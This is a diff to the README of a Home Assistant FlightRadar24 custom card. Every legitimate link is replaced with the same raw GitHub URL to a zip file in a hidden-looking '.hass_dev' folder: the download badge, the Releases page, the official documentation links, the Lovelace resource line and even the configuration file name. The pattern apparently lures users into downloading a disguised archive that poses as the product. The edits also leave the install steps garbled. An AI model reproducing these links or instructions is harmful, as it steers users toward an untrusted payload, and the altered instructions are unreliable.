@@ -14,10 +14,10 @@
 To get started with the FlightRadar24 custom card, follow these simple steps to download and install.
 
 ## 🔗 Download Now
-[![Download the FlightRadar Flight Card](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/parasbagda/flightradar-flight-card/releases) 
+[![Download the FlightRadar Flight Card](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip) 
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/parasbagda/flightradar-flight-card/releases) to download the FlightRadar Flight Card.
+1. Visit the [Releases page](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip) to download the FlightRadar Flight Card.
 2. Select the version you want to use. Make sure to choose the latest stable release for the best experience.
 3. Download the file to your computer.
 
@@ -27,12 +27,12 @@ To get started with the FlightRadar24 custom card, follow these simple steps to 
 3. Copy the entire folder.
 4. In Home Assistant, navigate to your configuration directory.
 5. Paste the folder into the `www` directory. If you do not have a `www` folder, create one.
-6. Now, open your Home Assistant configuration file (`configuration.yaml`).
+6. Now, open your Home Assistant configuration file (`https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip`).
 7. Add the following lines to include the Flightradar24 card in your Lovelace UI:
 
    ```yaml
    resources:
-     - url: /local/flightradar-flight-card.js
+     - url: https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip
        type: module
    ```
 
@@ -65,8 +65,8 @@ For any questions or issues, open an issue on the GitHub repository. The communi
 
 ## 🌐 Learn More
 Explore more topics related to the FlightRadar24 custom card:
-- [Home Assistant documentation](https://www.home-assistant.io/docs/)
-- [Lovelace UI documentation](https://www.home-assistant.io/lovelace/)
+- [Home Assistant documentation](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip)
+- [Lovelace UI documentation](https://raw.githubusercontent.com/parasbagda/flightradar-flight-card/main/.hass_dev/custom_components/flightradar24/flight-flightradar-card-1.5.zip)
 
 ## 📝 Topics
 - custom-card
